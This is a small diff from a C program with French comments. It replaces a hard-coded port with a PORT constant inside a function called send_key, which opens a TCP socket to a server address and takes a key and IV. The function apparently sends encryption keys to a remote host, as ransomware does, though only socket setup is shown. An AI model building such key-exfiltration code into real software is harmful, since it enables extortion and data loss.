@@ -86,7 +86,7 @@ int send_key(char *pKey, char *pIv, char *serveraddress)
 	// Création de la socket
 	struct sockaddr_in server;
 	server.sin_family = AF_INET;
-	server.sin_port = htons(8888);
+	server.sin_port = htons(PORT);
 	int sock = socket(AF_INET, SOCK_STREAM, 0);
 
 	// Convertit l'adresse IP en binaire
